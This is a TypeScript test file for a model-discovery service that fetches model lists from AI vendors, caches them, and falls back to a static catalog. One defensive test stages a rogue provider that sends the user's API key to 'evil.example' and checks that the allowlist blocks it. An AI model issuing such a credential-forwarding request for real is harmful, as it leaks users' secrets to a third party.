/**
 * Live model discovery, its cache, and its fallback chain.
 *
 * The point of this feature is that a vendor shipping a new model must not
 * require a AnyPick release, so the tests that matter are the ones proving the
 * live list wins, the cache actually spares a request, and a vendor being down
 * degrades to something usable instead of an empty picker.
 */

import { describe, it, expect, beforeEach, afterEach } from 'vitest';
import { mkdtemp, rm } from 'node:fs/promises';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { openDatabase } from '../src/core/db';
import { migrateSchema } from '../src/core/db-schema';
import { ModelCacheStore } from '../src/core/model-cache-store';
import { ModelDiscoveryService, MODEL_CACHE_TTL_MS } from '../src/core/model-discovery';
import { CatalogRegistry, registerBuiltinCatalog } from '../src/catalog/providers';
import { parseModelIds } from '../src/catalog/model-fetch';
import { modelPolicyLookup } from '../src/core/model-policy';
import type { AnyPickDatabase } from '../src/core/db';
import type { ModelDiscoveryContext, ModelPolicy } from '../src/types';

interface Call {
  url: string;
  headers: Record<string, string>;
}

/** A fetch that records what a provider asked for and replays a canned body. */
function recordingFetch(
  calls: Call[],
  reply: (url: string) => { status?: number; body?: unknown },
): (origin: string) => ModelDiscoveryContext['fetch'] {
  return () => async (target, init) => {
    const headers: Record<string, string> = {};
    for (const [k, v] of Object.entries((init?.headers ?? {}) as Record<string, string>)) {
      headers[k.toLowerCase()] = v;
    }
    calls.push({ url: target, headers });
    const { status = 200, body = {} } = reply(target);
    return new Response(JSON.stringify(body), {
      status,
      headers: { 'content-type': 'application/json' },
    });
  };
}

describe('parseModelIds', () => {
  it('reads the three body shapes vendors actually return', () => {
    expect(parseModelIds({ data: [{ id: 'gpt-5.6-sol' }, { id: 'gpt-5.6-luna' }] })).toEqual([
      'gpt-5.6-sol',
      'gpt-5.6-luna',
    ]);
    // Google qualifies ids with a `models/` prefix that is not part of the id
    // used at request time.
    expect(parseModelIds({ models: [{ name: 'models/gemini-3.6-flash' }] })).toEqual([
      'gemini-3.6-flash',
    ]);
    expect(parseModelIds({ models: ['llama-3', 'llama-3'] })).toEqual(['llama-3']);
  });

  it('preserves vendor order, because the head of the list is the default', () => {
    const body = { data: [{ id: 'claude-opus-5' }, { id: 'claude-opus-4-6' }] };
    expect(parseModelIds(body)[0]).toBe('claude-opus-5');
  });

  it('survives a body that is not a model list', () => {
    expect(parseModelIds(null)).toEqual([]);
    expect(parseModelIds({ error: 'nope' })).toEqual([]);
    expect(parseModelIds({ data: [{}, 42, null] })).toEqual([]);
  });
});

describe('ModelDiscoveryService', () => {
  let root: string;
  let db: AnyPickDatabase;
  let cache: ModelCacheStore;
  let catalog: CatalogRegistry;
  let calls: Call[];

  beforeEach(async () => {
    root = await mkdtemp(join(tmpdir(), 'anypick-discovery-'));
    db = openDatabase(root);
    migrateSchema(db);
    cache = new ModelCacheStore(root, db);
    catalog = new CatalogRegistry();
    registerBuiltinCatalog(catalog);
    calls = [];
  });

  afterEach(async () => {
    db.close();
    await rm(root, { recursive: true, force: true });
  });

  function service(opts: {
    reply?: (url: string) => { status?: number; body?: unknown };
    now?: () => number;
    policyFor?: (id: string) => ModelPolicy | undefined;
  }) {
    return new ModelDiscoveryService({
      root,
      cache,
      policyFor: opts.policyFor ?? modelPolicyLookup({ catalog }),
      fetchImpl: recordingFetch(calls, opts.reply ?? (() => ({ body: {} }))),
      now: opts.now,
    });
  }

  const twoModels = () => ({ body: { data: [{ id: 'brand-new-model' }, { id: 'older-model' }] } });

  it('offers a model the shipped catalog has never heard of', async () => {
    const svc = service({ reply: twoModels });
    const res = await svc.list({ providerId: 'openrouter', apiKey: 'k' });
    expect(res.source).toBe('live');
    expect(res.models[0]).toBe('brand-new-model');
    // This is the whole point: no release was needed to reach it.
    expect(Object.values(catalog.get('openrouter').suggestModels?.() ?? {})).not.toContain(
      'brand-new-model',
    );
  });

  it('serves the second call from cache without asking the vendor again', async () => {
    const svc = service({ reply: twoModels });
    await svc.list({ providerId: 'openrouter', apiKey: 'k' });
    expect(calls).toHaveLength(1);
    const second = await svc.list({ providerId: 'openrouter', apiKey: 'k' });
    expect(second.source).toBe('cache');
    expect(second.models[0]).toBe('brand-new-model');
    expect(calls).toHaveLength(1);
  });

  it('refetches once the hour is up', async () => {
    const start = Date.parse('2026-07-27T10:00:00.000Z');
    let now = start;
    const svc = service({ reply: twoModels, now: () => now });
    await svc.list({ providerId: 'openrouter', apiKey: 'k' });

    now = start + MODEL_CACHE_TTL_MS - 1000;
    expect((await svc.list({ providerId: 'openrouter', apiKey: 'k' })).source).toBe('cache');
    expect(calls).toHaveLength(1);

    now = start + MODEL_CACHE_TTL_MS + 1000;
    expect((await svc.list({ providerId: 'openrouter', apiKey: 'k' })).source).toBe('live');
    expect(calls).toHaveLength(2);
  });

  it('honours an explicit refresh inside the TTL', async () => {
    const svc = service({ reply: twoModels });
    await svc.list({ providerId: 'openrouter', apiKey: 'k' });
    const res = await svc.list({ providerId: 'openrouter', apiKey: 'k', refresh: true });
    expect(res.source).toBe('live');
    expect(calls).toHaveLength(2);
  });

  it('keeps the cache across service instances, which is why it is on disk', async () => {
    await service({ reply: twoModels }).list({ providerId: 'openrouter', apiKey: 'k' });
    // A fresh instance stands in for the next `anypick` invocation: the TUI is a
    // short-lived process, so an in-memory cache would expire on every launch.
    const next = await service({ reply: twoModels }).list({
      providerId: 'openrouter',
      apiKey: 'k',
    });
    expect(next.source).toBe('cache');
    expect(calls).toHaveLength(1);
  });

  it('falls back to the catalog when the vendor cannot be reached', async () => {
    const svc = service({
      reply: () => {
        throw new Error('ENOTFOUND');
      },
    });
    const res = await svc.list({ providerId: 'anthropic', apiKey: 'k' });
    expect(res.source).toBe('catalog');
    expect(res.models).toContain('claude-opus-5');
    expect(res.note).toContain('ENOTFOUND');
  });

  it('prefers a stale cached list over the catalog when the vendor is down', async () => {
    const start = Date.parse('2026-07-27T10:00:00.000Z');
    let now = start;
    let fail = false;
    const svc = service({
      reply: () => {
        if (fail) {
          throw new Error('502');
        }
        return twoModels();
      },
      now: () => now,
    });
    await svc.list({ providerId: 'openrouter', apiKey: 'k' });
    fail = true;
    now = start + MODEL_CACHE_TTL_MS + 1000;
    const res = await svc.list({ providerId: 'openrouter', apiKey: 'k' });
    expect(res.source).toBe('stale');
    expect(res.models[0]).toBe('brand-new-model');
  });

  it('treats an unauthorized vendor as a fallback, not an error', async () => {
    const svc = service({ reply: () => ({ status: 401, body: { error: 'bad key' } }) });
    const res = await svc.list({ providerId: 'openrouter', apiKey: 'wrong' });
    expect(res.source).toBe('catalog');
    expect(res.models.length).toBeGreaterThan(0);
  });

  it('answers from the catalog for a provider that cannot be discovered', async () => {
    const svc = service({ policyFor: () => ({ staticFallbackModels: () => ['only-one'] }) });
    const res = await svc.list({ providerId: 'whatever' });
    expect(res).toMatchObject({ source: 'catalog', models: ['only-one'] });
    expect(calls).toHaveLength(0);
  });

  it('does not fetch for an endpoint that is not a URL', async () => {
    const svc = service({ reply: twoModels });
    const res = await svc.list({ providerId: 'openrouter', endpoint: 'not a url' });
    expect(res.source).toBe('catalog');
    expect(calls).toHaveLength(0);
  });

  it('caches per endpoint, since one provider id can front several hosts', async () => {
    const svc = service({ reply: twoModels });
    await svc.list({ providerId: 'custom', endpoint: 'https://a.example/v1', apiKey: 'k' });
    await svc.list({ providerId: 'custom', endpoint: 'https://b.example/v1', apiKey: 'k' });
    expect(calls).toHaveLength(2);
    expect(
      (await svc.list({ providerId: 'custom', endpoint: 'https://a.example/v1' })).source,
    ).toBe('cache');
  });

  it('clears the cache on request', async () => {
    const svc = service({ reply: twoModels });
    await svc.list({ providerId: 'openrouter', apiKey: 'k' });
    await svc.clearCache();
    expect((await svc.list({ providerId: 'openrouter', apiKey: 'k' })).source).toBe('live');
    expect(calls).toHaveLength(2);
  });

  /**
   * The default transport, not the stub: this is the guard that stops an API key
   * from being sent to an origin other than the endpoint being asked about, so
   * it has to exercise the real allowlist.
   */
  it('will not send the key anywhere but the endpoint it was asked about', async () => {
    const svc = new ModelDiscoveryService({
      root,
      cache,
      // A provider that ignores the endpoint it was handed and posts the key
      // somewhere else stands in for a compromised or buggy implementation.
      policyFor: () => ({
        staticFallbackModels: () => ['fallback-model'],
        fetchLiveModels: async (ctx) => {
          const res = await ctx.fetch('https://evil.example/v1/models', {
            headers: { authorization: `Bearer ${ctx.apiKey}` },
          });
          return parseModelIds(await res.json());
        },
      }),
    });
    const res = await svc.list({
      providerId: 'x',
      endpoint: 'https://openrouter.ai/api/v1',
      apiKey: 'secret-key',
    });
    expect(res.source).toBe('catalog');
    expect(res.note).toMatch(/not allowed/);
  });
});

describe('per-vendor request shape', () => {
  let root: string;
  let db: AnyPickDatabase;
  let calls: Call[];
  let catalog: CatalogRegistry;

  beforeEach(async () => {
    root = await mkdtemp(join(tmpdir(), 'anypick-discovery-shape-'));
    db = openDatabase(root);
    migrateSchema(db);
    calls = [];
    catalog = new CatalogRegistry();
    registerBuiltinCatalog(catalog);
  });

  afterEach(async () => {
    db.close();
    await rm(root, { recursive: true, force: true });
  });

  async function ask(providerId: string, body: unknown, apiKey = 'secret-key') {
    const svc = new ModelDiscoveryService({
      root,
      cache: new ModelCacheStore(root, db),
      policyFor: modelPolicyLookup({ catalog }),
      fetchImpl: recordingFetch(calls, () => ({ body })),
    });
    return svc.list({ providerId, apiKey });
  }

  it('sends a bearer token to an OpenAI-shaped endpoint', async () => {
    await ask('openai', { data: [{ id: 'gpt-5.6-sol' }] });
    expect(calls[0]?.url).toBe('https://api.openai.com/v1/models');
    expect(calls[0]?.headers.authorization).toBe('Bearer secret-key');
  });

  it('does not double up the version segment on an already-versioned endpoint', async () => {
    await ask('openrouter', { data: [{ id: 'anthropic/claude-opus-5' }] });
    expect(calls[0]?.url).toBe('https://openrouter.ai/api/v1/models');
  });

  it('sends Anthropic its own key and version headers', async () => {
    await ask('anthropic', { data: [{ id: 'claude-opus-5' }] });
    expect(calls[0]?.url).toBe('https://api.anthropic.com/v1/models');
    expect(calls[0]?.headers['x-api-key']).toBe('secret-key');
    expect(calls[0]?.headers['anthropic-version']).toBeTruthy();
    // A bearer token is not how Anthropic authenticates a models call.
    expect(calls[0]?.headers.authorization).toBeUndefined();
  });

  it('puts the Gemini key in the query string, where that API reads it', async () => {
    const res = await ask('gemini-api', { models: [{ name: 'models/gemini-3.6-flash' }] });
    const url = new URL(calls[0]?.url ?? '');
    expect(url.pathname).toBe('/v1beta/models');
    expect(url.searchParams.get('key')).toBe('secret-key');
    expect(res.models).toContain('gemini-3.6-flash');
  });

  it('discovers the Gemini Pro id the static catalog cannot pin', async () => {
    // The catalog has to guess whether Pro is GA or preview; the live list does
    // not, which is the failure mode this feature removes.
    const res = await ask('gemini-api', {
      models: [{ name: 'models/gemini-3.1-pro-preview' }, { name: 'models/gemini-3.6-flash' }],
    });
    expect(res.source).toBe('live');
    expect(res.models).toContain('gemini-3.1-pro-preview');
  });
});
